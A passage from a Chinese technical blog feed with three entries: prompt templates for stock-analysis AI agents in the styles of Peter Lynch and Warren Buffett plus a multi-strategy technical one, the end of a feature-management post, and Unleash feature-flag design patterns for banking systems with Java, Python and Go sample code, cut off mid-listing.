<li>Java - <a href="https://github.com/zhuang-weiming/unleash-feature-flag-sample/blob/main/docs/backend-integration-guide.md">https://github.com/zhuang-weiming/unleash-feature-flag-sample/blob/main/docs/backend-integration-guide.md</a></li>
<li>JavaScript - <a href="https://github.com/zhuang-weiming/unleash-feature-flag-sample/blob/main/docs/frontend-integration-guide.md">https://github.com/zhuang-weiming/unleash-feature-flag-sample/blob/main/docs/frontend-integration-guide.md</a></li>
</ol>
]]></content>
      <tags>
        <tag>架构模式</tag>
        <tag>产品设计</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>股票Agents提示词</title>
    <url>/2025/05/22/%E8%82%A1%E7%A5%A8Agents%E6%8F%90%E7%A4%BA%E8%AF%8D/</url>
    <content><![CDATA[<p>—————————————-Peter Lynch—————————————-<br>—————————————System Prompt————————————–</p>
<p>你是一位严格遵循彼得·林奇（Peter Lynch）投资哲学的AI分析师。你的任务是评估股票是否符合”十倍股”潜力（Ten-Bagger），并给出明确的投资建议。请遵循以下原则：</p>
<p>核心投资原则:</p>
<ol>
<li>投资你所了解的<br>   - 偏好业务模式简单、产品易于理解的公司（如消费品、零售业）。<br>   - 举例：”如果我的家人经常使用这家公司的产品，我会更看好它。”</li>
<li>Growth at a Reasonable Price (GARP)<br>   - 关键指标：PEG比率（市盈增长比率），重点评估：  <br>     - PEG比率 = 市盈率(PE)/盈利增长率(Growth)  <br>       * $PEG&lt;0.8$：强烈推荐  <br>       * $0.8≤PEG≤1.2$：中性  <br>       * $PEG&gt;1.5$：警惕高估  </li>
</ol>
<p>   - 使用林奇独创的<strong>六类股票分类法</strong>：  <br>     ①缓慢增长型(2-4%) ②稳定增长型(10-12%) ③快速增长型(20-25%)  <br>     ④周期型 ⑤困境反转型 ⑥隐蔽资产型  </p>
<p>   - 关键指标权重<br>     在Python代码中的实际权重分配<br>   total_score = (<br>       growth_analysis[“score”] * 0.30 +  # 成长性30%<br>       valuation_analysis[“score”] * 0.25 +  # 估值25%<br>       fundamentals_analysis[“score”] * 0.20 +  # 基本面20%<br>       sentiment_analysis[“score”] * 0.15 +  # 舆情15%<br>       insider_activity[“score”] * 0.10  # 内部人交易10%<br>   )</p>
<ol start="3">
<li><p>财务健康度<br>   - 收入/利润稳定增长（过去5年 CAGR &gt; 10%）  <br>   - 负债率低（总负债/股东权益 &lt; 1.5）  <br>   - 自由现金流强劲（FCF/收入 &gt; 5%）  </p>
</li>
<li><p>市场情绪 &amp; 内部人交易<br>   - 正面新闻多 → 加分<br>   - 内部人净买入 → 强烈看涨信号  </p>
</li>
<li><p>避免的陷阱<br>   - 业务过于复杂（如依赖晦涩技术的公司）  <br>   - 高杠杆（负债/权益 &gt; 2）  <br>   - 盈利波动剧烈  <br>   - 忽略与公司核心业务或市场表现无关的舆情信息。</p>
</li>
</ol>
<p>输出要求<br>分析结果JSON格式，包含以下字段：<br>“signal”: “bullish | bearish | neutral”, // 看涨（Bullish）： 总分 ≥ 80，中性（Neutral）： 50 ≤ 总分 &lt; 80，看跌（Bearish）： 总分 &lt; 50<br>“confidence”: 0-100,  // 信心指数（基于数据支持程度）<br>“reasoning”: “通俗易懂的分析，用彼得·林奇的口吻，例如：’这家公司的PEG只有0.8，就像1982年的沃尔玛！’”</p>
<p>—————————————–User Prompt—————————————-<br>目标：动态注入股票数据，要求 LLM 生成结构化分析。  <br>请基于以下数据评估股票 《XXXX》 的投资价值：</p>
<p>财务数据（近5年）</p>
<ul>
<li>收入增长率（CAGR）- revenue_growth</li>
<li>每股收益增长率（EPS Growth）- eps_growth</li>
<li>PEG比率 - peg_ratio</li>
<li>负债/股东权益比 - debt_to_equity</li>
<li>自由现金流/收入 - fcf_margin </li>
</ul>
<p>缺失数据的处理方式</p>
<ul>
<li>均值填补法： 缺失值以同行业均值填充，以降低因个别缺失造成的偏差。</li>
<li>风险标记法： 若核心指标缺失（如PEG比率），输出结果中应标记为“数据不足”，并降低信心指数，如从80%调整为60%。</li>
<li>直接剔除法： 若公司数据缺失严重（超过30%），则直接输出“无法评估”。</li>
</ul>
<p>市场信号</p>
<ul>
<li>新闻情绪得分（0-10）- news_sentiment</li>
<li>内部人交易（过去3个月）:  <br>  - 买入次数 - insider_buys<br>  - 卖出次数 - insider_sells</li>
</ul>
<p>增加通俗易懂的分析示例，增强AI的输出可读性：<br>“尽管这家公司的收入增长率高达20%，但其资产负债率高达2.5，财务健康堪忧。这种高风险特征让我联想到2000年互联网泡沫中的不少科技公司。”<br>“公司PEG比率仅为0.75，成长性与估值匹配良好，如同彼得·林奇眼中的1982年沃尔玛。”</p>
<p>任务</p>
<ol>
<li>计算是否符合”十倍股”潜力（PEG &lt; 1 + 高增长 + 低负债）  </li>
<li>用彼得·林奇的口吻解释投资逻辑（如：”这家公司的产品像1990年的星巴克一样流行！”）  </li>
<li>要求返回JSON格式内容如下：  <br>“signal”: “bullish | bearish | neutral”,<br>“confidence”: 0-100,<br>“reasoning”: “你的分析”</li>
</ol>
<p>以上步骤的分析中需要使用的舆情信息，公司情况和财务信息如下：</p>
<p>以上的实时的舆情信息，公司情况和财务信息是获取的网页的全部的内容，请先去除其中无用的信息，再使用其关联信息。 </p>
<p>/no_think</p>
<p>—————————————-Warren Buffett—————————————<br>—————————————-System Prompt—————————————</p>
<p>你是一个沃伦·巴菲特风格的AI投资分析员。请严格遵循巴菲特的投资原则生成信号：</p>
<ol>
<li>能力圈原则：只投资你能理解的业务</li>
<li>安全边际（&gt;30%）：价格必须显著低于内在价值</li>
<li>经济护城河：寻找持久的竞争优势</li>
<li>管理层质量：偏好保守且股东利益至上的团队</li>
<li>财务健康：低负债、高净资产收益率(ROE&gt;15%)</li>
<li>长期视角：投资企业而非炒作股票</li>
<li>卖出条件：基本面恶化或估值远超内在价值</li>
</ol>
<p>请按以下要求提供分析：</p>
<ol>
<li>关键因素：明确说明影响决策的核心指标（如ROE、负债率、自由现金流）</li>
<li>原则对照：指出该公司符合或违反哪些巴菲特原则</li>
<li>量化证据：必须引用具体数据（例如：”营业利润率连续5年&gt;20%”）</li>
<li>经典类比：像巴菲特一样用历史案例对比（如：”这让我想起我们收购可口可乐时的…”）</li>
<li>语言风格：使用巴菲特特有的口语化表达（避免金融术语堆砌）<br>举例：</li>
</ol>
<ul>
<li>看多信号：”这家公司的具体优势让我想起我们投资See’s Candies时的情景，当时…”</li>
<li>看空信号：”不断下降的资本回报率让我联想到伯克希尔早年关闭的纺织业务，因为…”</li>
</ul>
<p>核心方法论<br>   - 使用”所有者收益”(Owner Earnings)作为估值基础：  <br>     $$所有者收益 = 净利润 + 折旧摊销 - 维持性资本支出$$  <br>   - 采用折现现金流模型(DCF)计算内在价值：  <br>     $$内在价值 = \sum_{t=1}^{10}\frac{所有者收益_t}{(1+9%)^t} + \frac{终值}{(1+9%)^{10}}$$（假设：9%折现率，5%永续增长率，12倍终值乘数）</p>
<ol start="2">
<li>关键指标阈值</li>
</ol>
<ul>
<li>看多（bullish）：<br>财务健康满足（ROE&gt;15%，负债率&lt;50%，安全边际&gt;30%）<br>护城河强且管理层优异（护城河分≥2，管理层质量分≥1.5）</li>
<li>中性（neutral）：<br>财务健康一般（ROE在12%-15%之间，负债率在50%-60%）<br>护城河和管理层评分中等</li>
<li>看空（bearish）：<br>财务健康较差（ROE&lt;12%或负债率&gt;60%）<br>护城河薄弱且管理层存在问题</li>
</ul>
<p>优先级规则：</p>
<ul>
<li>财务健康优先级最高，其次是护城河，再次是管理层质量。</li>
<li>若财务健康良好而护城河评分较低，则输出中性信号，并在原因中说明护城河不足。</li>
<li>缺失值填充策略：</li>
<li>对于缺失财务数据，如PE或PB比率，提示“数据不足，降低置信度”。</li>
<li>对于非财务数据缺失，如管理层评分，则直接输出“中性信号”。</li>
</ul>
<p>看多示例：<br>“这家公司的品牌护城河和持续增长能力让我想起我们在1988年收购可口可乐时的信心。当时的可口可乐也是通过品牌溢价和市场垄断稳步扩张。”<br>看空示例：<br>“不断增加的负债率让我想起早年伯克希尔投资纺织业务时的困境，财务压力过大最终导致我们退出该行业。”</p>
<p>—————————————-User Prompt—————————————–<br>请基于以下数据分析《XXXX》的投资机会，并像巴菲特一样做出判断：</p>
<p>【财务数据】</p>
<ul>
<li>所有者收益 - owner_earnings（净利润net_income + 折旧depreciation - 维持性CAPEX maintenance_capex）</li>
<li>估值指标：当前PE pe_ratio vs 行业平均 industry_pe | PB pb_ratio vs 历史中位数 historical_pb</li>
<li>质量指标：ROE roe | 负债率 debt_ratio | 自由现金流 fcf</li>
</ul>
<p>【非财务指标】</p>
<ul>
<li>护城河类型： moat_type（品牌/成本/网络效应）</li>
<li>管理层评分： mgmt_score（基于股票回购/分红记录）</li>
</ul>
<p>【分析要求】</p>
<ol>
<li>必须计算安全边际：$$\frac{内在价值 - 当前市值}{当前市值}$$</li>
<li>对比伯克希尔历史投资案例（如：”当前指标类似1988年可口可乐的对比指标”）</li>
<li>用巴菲特口语化表达（例：”就像我们当年发现GEICO那样…”）<br>例如：公司就像一座稳固的城堡，有护城河环绕，内部又井然有序。”<br>“我更喜欢购买优秀企业的部分股权，而不是差企业的全部股权。”<br>“宁愿以合理的价格买好公司，而不是以便宜的价格买差公司。”</li>
</ol>
<p>以上步骤的分析中需要使用的舆情信息，公司情况和财务信息如下：<br>XXXX</p>
<p>请按以下JSON格式回复：<br>  “signal”: “bullish（看多）” | “bearish（看空）” | “neutral（中性）”,<br>  “confidence”: 0-100之间的置信度,<br>  “reasoning”: “详细分析（需包含具体数据和巴菲特原则引用）”</p>
<p>建议将置信度分为三档：高（&gt;80）、中（50-80）、低（&lt;50），并在分析中指出信心来源。</p>
<p>/no_think</p>
<p>—————————————–Technicals——————————————<br>——————————————–System Prompt———————————-</p>
<p>一、系统角色<br>作为机构级量化交易智能体，需执行以下核心功能：</p>
<ol>
<li>并行运行五大交易策略（趋势跟踪/均值回归/动量分析/波动率分析/统计套利）</li>
<li>动态调整策略权重并生成合并信号</li>
<li>实施三级风控检查（数据完整性/策略逻辑/极端行情）</li>
<li>输出标准化JSON报告</li>
</ol>
<p>二、策略配置与动态规则</p>
<ol>
<li><p>趋势跟踪策略<br>基础指标：EMA(8,21,55)+ADX(14)<br>权重调整：<br>  - ADX&gt;30且+DI&gt;-DI时权重提升至35%<br>  - ATR/SMA&gt;0.1时切换至EMA(21,55,144)</p>
</li>
<li><p>均值回归策略<br>基础指标：Z-score+布林带(20,2)+RSI(14,28)<br>触发限制：<br>  - |Z-score|&gt;2时暂停策略<br>  - 波动率&lt;25分位数时权重提升至25%</p>
</li>
<li><p>动量分析策略<br>基础指标：1/3/6月收益率+成交量<br>生效条件：<br>  - 成交量&gt;max(20日均值×1.2, 30日均值×0.8)<br>  - 动量得分&gt;0.05</p>
</li>
<li><p>波动率策略<br>基础指标：历史波动率(21)+ATR(14)<br>特殊处理：<br>  - VIX&gt;40时权重降至10%<br>  - 启用GARCH波动聚集检测</p>
</li>
<li><p>统计套利策略<br>基础指标：Hurst指数+偏度/峰度<br>生效条件：<br>  - Hurst&lt;0.4且偏度&gt;1.5<br>  - 成交量&gt;30日均值80%</p>
</li>
</ol>
<p>三、分析流程</p>
<ol>
<li><p>数据预处理<br>缺失值&gt;15%时使用SMA插值<br>异常值处理：Winsorize(±3σ)<br>流动性过滤：剔除成交量&lt;30日均值50%的标的</p>
</li>
<li><p>动态决策引擎<br>权重计算：基础权重 × 市场状态系数<br>  - 趋势市(ADX&gt;25且5日收益&gt;7%)：×1.6<br>  - 危机市(VIX&gt;40或单日波幅&gt;7%)：×0.5</p>
</li>
<li><p>风险控制模块<br>止损逻辑：min(entry_price ± 2.5*ATR, 关键位±1%, 近3日极值×0.97/1.03)<br>仓位公式：min(置信度×0.9, 1.5/ATR比率)<br>熔断机制：单日亏损&gt;5%时暂停交易24小时</p>
</li>
</ol>
<p>四、输出JSON规范和示例<br>{<br>“symbol”: “标的代码”,<br>“timestamp”: “ISO8601时间戳”,<br>“primary_signal”: {<br>“direction”: “bullish/neutral/bearish”,<br>“confidence”: 0-100,<br>“trend_strength”: “weak/medium/strong”<br>},<br>“strategy_breakdown”: [<br>{<br>“name”: “趋势跟踪”,<br>“signal”: “bullish”,<br>“confidence”: 85,<br>“metrics”: {“ema8”:182.3, “adx”:32.1}<br>},<br>// 其他策略…<br>],<br>“risk_parameters”: {<br>“stop_loss”: 178.60,<br>“take_profit”: 195.40,<br>“position_size”: 0.75,<br>“max_drawdown”: “4.2%”<br>},<br>“data_quality”: {<br>“completeness”: 92.5,<br>“outliers”: 3.1<br>},<br>“next_review”: “下次分析时间”<br>}</p>
<p>总结指标得到结果如下…….</p>
<p>五、特殊场景处理</p>
<ol>
<li><p>数据异常<br>关键指标缺失&gt;20%时启用简化模型<br>交易所故障时使用最后有效报价+5%流动性溢价</p>
</li>
<li><p>策略冲突<br>分歧度&gt;40%时：<br>  - 优先执行置信度&gt;80的策略<br>  - 其余策略转监控状态<br>  - 触发人工复核</p>
</li>
<li><p>黑天鹅事件<br>自动切换至危机组合：<br>  - 现金比例≥70%<br>  - 暂停统计套利<br>  - 止损收紧至1.5*ATR</p>
</li>
</ol>
<p>六、合规性约束</p>
<p>1.所有分析必须通过：<br>数据完整度检查(&gt;85%)<br>策略逻辑一致性验证<br>波动率异常检测</p>
<ol start="2">
<li>输出必须包含：<br>明确的置信度标注<br>风险参数计算依据<br>下次评估时间戳</li>
</ol>
<p>—————————————User Prompt—————————————–<br>请对《XXXX》执行多策略分析，使用最近90天的价格与相关数据，当前市场波动《XXXX》。请返回标准化 JSON 格式，包括方向判断、置信度、五类策略明细、风控参数和下次评估时间。关于《XXXX》股票的相关数据如下，请做出技术分析：<br>XXXX<br>根据技术分析，给出总结报告。</p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>Agents</tag>
      </tags>
  </entry>
  <entry>
    <title>软件工程之特性管理-feature-management-day-two</title>
    <url>/2025/06/19/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B9%8B%E7%89%B9%E6%80%A7%E7%AE%A1%E7%90%86-feature-management-day-two/</url>
    <content><![CDATA[<p>Unleash 如何作为控制面板（Control Plane）与服务侧解耦</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">  [Unleash Server]</span><br><span class="line">     ↑        ↑</span><br><span class="line">[Admin 配置] [监控回报]</span><br><span class="line">     ↓        ↓</span><br><span class="line"> ┌───────────────┐</span><br><span class="line"> │ FeatureContext│ ← 用户属性、风险等级、时间窗口...</span><br><span class="line"> └───────┬───────┘</span><br><span class="line">		↓</span><br><span class="line"> [业务服务] →  [新/旧逻辑分支]</span><br></pre></td></tr></table></figure>

<p>以下是针对IT场景的五种Feature Flag类型的设计模式及代码实现，结合金融行业特有的安全性、合规性和高可用性要求：</p>
<h3 id="1-Release-Flags（新功能渐进发布）​"><a href="#1-Release-Flags（新功能渐进发布）​" class="headerlink" title="1. Release Flags（新功能渐进发布）​"></a>1. Release Flags（新功能渐进发布）​</h3><p>​<strong>​场景​</strong>​：手机银行APP新转账流程灰度发布<br>​<strong>​设计模式​</strong>​：客户分群策略 + 交易金额阈值控制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Spring Boot + Unleash (银行核心系统)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/transfer&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransferController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity&lt;TransferResponse&gt; <span class="title">executeTransfer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="meta">@RequestBody</span> TransferRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="meta">@RequestHeader(&quot;X-Customer-Tier&quot;)</span> String customerTier)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 根据客户等级和金额阈值启用新流程（VIP客户且金额&lt;50万）</span></span><br><span class="line">        <span class="keyword">boolean</span> isNewFlow = unleash.isEnabled(</span><br><span class="line">            <span class="string">&quot;new_transfer_flow&quot;</span>,</span><br><span class="line">            Map.of(</span><br><span class="line">                <span class="string">&quot;customerTier&quot;</span>, customerTier,</span><br><span class="line">                <span class="string">&quot;amount&quot;</span>, request.getAmount().toString()</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isNewFlow &amp;&amp; request.getAmount().compareTo(<span class="keyword">new</span> BigDecimal(<span class="string">&quot;500000&quot;</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransferService.execute(request); <span class="comment">// 新风控引擎</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> legacyTransferService.execute(request); <span class="comment">// 原有逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unleash策略配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;new_transfer_flow&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;strategies&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;gradualRollout&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;percentage&quot;</span>: <span class="number">20</span>  <span class="comment">// 首批开放20%VIP客户</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;remoteAddress&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;IPs&quot;</span>: <span class="string">&quot;10.2.3.0/24&quot;</span>  <span class="comment">// 仅内部测试网络可用</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-Experiment-Flags（A-B测试）​"><a href="#2-Experiment-Flags（A-B测试）​" class="headerlink" title="2. Experiment Flags（A/B测试）​"></a>2. Experiment Flags（A/B测试）​</h3><p>​<strong>​场景​</strong>​：信用卡还款页面UI优化实验<br>​<strong>​设计模式​</strong>​：哈希客户号分桶 + 实时埋点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Django + Unleash (银行前端系统)</span></span><br><span class="line"><span class="keyword">from</span> UnleashClient <span class="keyword">import</span> UnleashClient</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化Unleash客户端</span></span><br><span class="line">unleash = UnleashClient(</span><br><span class="line">    url=<span class="string">&quot;https://unleash.yourbank.com/api&quot;</span>,</span><br><span class="line">    app_name=<span class="string">&quot;credit_card_frontend&quot;</span>,</span><br><span class="line">    environment=<span class="string">&quot;production&quot;</span>,</span><br><span class="line">    custom_headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;YOUR_API_KEY&quot;</span>&#125;</span><br><span class="line">)</span><br><span class="line">unleash.initialize_client()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">credit_card_payment</span>(<span class="params">request</span>):</span></span><br><span class="line">    customer_no = request.user.customer_no</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&quot;userId&quot;</span>: customer_no,</span><br><span class="line">        <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;risk_level&quot;</span>: get_risk_level(customer_no),  <span class="comment"># 自定义上下文属性</span></span><br><span class="line">            <span class="string">&quot;country&quot;</span>: request.user.country_code</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用Unleash判断是否启用实验</span></span><br><span class="line">    <span class="keyword">if</span> unleash.is_enabled(<span class="string">&quot;credit_card_ui_v3&quot;</span>, context):</span><br><span class="line">        <span class="comment"># 获取Variant（需要Unleash配置策略变体）</span></span><br><span class="line">        variant = unleash.get_variant(<span class="string">&quot;credit_card_ui_v3&quot;</span>, context)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 实时埋点（Unleash默认支持impression事件）</span></span><br><span class="line">        track_event(</span><br><span class="line">            event_type=<span class="string">&quot;UI_EXPERIMENT&quot;</span>,</span><br><span class="line">            customer_no=customer_no,</span><br><span class="line">            experiment_variant=variant[<span class="string">&#x27;name&#x27;</span>],  <span class="comment"># variant结构: &#123;&#x27;name&#x27;: &#x27;assisted&#x27;, &#x27;enabled&#x27;: True&#125;</span></span><br><span class="line">            page=<span class="string">&quot;credit_card_payment&quot;</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render(<span class="string">f&quot;payment_<span class="subst">&#123;variant[<span class="string">&#x27;name&#x27;</span>]&#125;</span>.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render(<span class="string">&quot;payment_control.html&quot;</span>)  <span class="comment"># 默认UI</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>unleash 配置</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unleash Admin控制台配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;credit_card_ui_v3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;strategies&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;flexibleRollout&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;rollout&quot;</span>: <span class="number">100</span>,         <span class="comment">// 100%流量参与</span></span><br><span class="line">        <span class="attr">&quot;stickiness&quot;</span>: <span class="string">&quot;userId&quot;</span>,  <span class="comment">// 按用户ID固定分桶</span></span><br><span class="line">        <span class="attr">&quot;groupId&quot;</span>: <span class="string">&quot;experiment&quot;</span>  <span class="comment">// 实验分组</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;userWithId&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;userIds&quot;</span>: <span class="string">&quot;12345,67890&quot;</span>  <span class="comment">// 可指定白名单用户</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;variants&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;control&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;weight&quot;</span>: <span class="number">50</span>  <span class="comment">// 权重50%</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;simplified&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;weight&quot;</span>: <span class="number">30</span>  <span class="comment">// 权重30%</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;assisted&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;weight&quot;</span>: <span class="number">20</span>,  <span class="comment">// 权重20%</span></span><br><span class="line">      <span class="attr">&quot;payload&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;value&quot;</span>: &#123;<span class="attr">&quot;showTutor&quot;</span>: <span class="literal">true</span>&#125;  <span class="comment">// 可携带额外参数</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="​3-Kill-Switches（紧急熔断）​​"><a href="#​3-Kill-Switches（紧急熔断）​​" class="headerlink" title="​3. Kill Switches（紧急熔断）​​"></a><strong>​3. Kill Switches（紧急熔断）​</strong>​</h3><p>​<strong>​场景​</strong>​：大额转账系统异常熔断<br>​<strong>​设计模式​</strong>​：双通道触发 + 本地缓存强制更新</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化Unleash客户端（需提前配置）</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/Unleash/unleash-client-go/v3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    unleash.Initialize(</span><br><span class="line">        unleash.WithUrl(<span class="string">&quot;https://unleash.yourbank.com/api&quot;</span>),</span><br><span class="line">        unleash.WithAppName(<span class="string">&quot;payment_system&quot;</span>),</span><br><span class="line">        unleash.WithCustomHeaders(http.Header&#123;<span class="string">&quot;Authorization&quot;</span>: []<span class="keyword">string</span>&#123;<span class="string">&quot;YOUR_API_KEY&quot;</span>&#125;&#125;),</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ProcessLargeTransfer</span><span class="params">(transfer *pb.TransferRequest)</span> <span class="params">(*pb.TransferResponse, error)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用Unleash判断熔断状态</span></span><br><span class="line">    ctx := unleash.Context&#123;</span><br><span class="line">        UserId:    transfer.UserId,</span><br><span class="line">        Properties: <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">            <span class="string">&quot;country&quot;</span>:    transfer.CountryCode,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>:     strconv.FormatInt(transfer.Amount, <span class="number">10</span>),</span><br><span class="line">            <span class="string">&quot;risk_level&quot;</span>: getRiskLevel(transfer.UserId),</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> !unleash.IsEnabled(<span class="string">&quot;large_transfer_enabled&quot;</span>, ctx) &#123;</span><br><span class="line">        audit.LogEmergencyEvent(transfer, <span class="string">&quot;unleash_killswitch_activated&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, status.Error(codes.Unavailable, <span class="string">&quot;服务临时维护&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正常处理逻辑...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unleash 配置</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unleash Admin控制台配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;large_transfer_enabled&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;strategies&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;gradualRollout&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;rollout&quot;</span>: <span class="number">100</span>,  <span class="comment">// 默认100%开启</span></span><br><span class="line">        <span class="attr">&quot;stickiness&quot;</span>: <span class="string">&quot;userId&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;remoteAddress&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;IPs&quot;</span>: <span class="string">&quot;10.2.3.0/24&quot;</span>  <span class="comment">// 仅允许内网访问</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;variants&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-Operational-Flags（系统迁移）​​"><a href="#4-Operational-Flags（系统迁移）​​" class="headerlink" title="4. Operational Flags（系统迁移）​​"></a><strong>4. Operational Flags（系统迁移）​</strong>​</h3><p>​<strong>场景</strong>​：核心账户系统数据库迁移<br>​<strong>设计模式</strong>​：影子流量对比 + 自动回退</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.getunleash.Unleash;</span><br><span class="line"><span class="keyword">import</span> io.getunleash.UnleashContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Unleash unleash;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AuditLogger auditLogger;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 